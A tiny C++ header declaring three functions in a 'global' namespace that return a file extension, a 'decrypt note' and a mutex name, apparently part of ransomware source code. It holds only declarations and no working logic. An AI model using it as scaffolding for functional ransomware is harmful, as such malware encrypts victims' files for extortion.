#pragma once
#include "common.h"

namespace global {

	PWCHAR GetExtention();
	PCHAR GetDecryptNote(PDWORD pdwDecryptNote);
	PCHAR GetMutexName();

}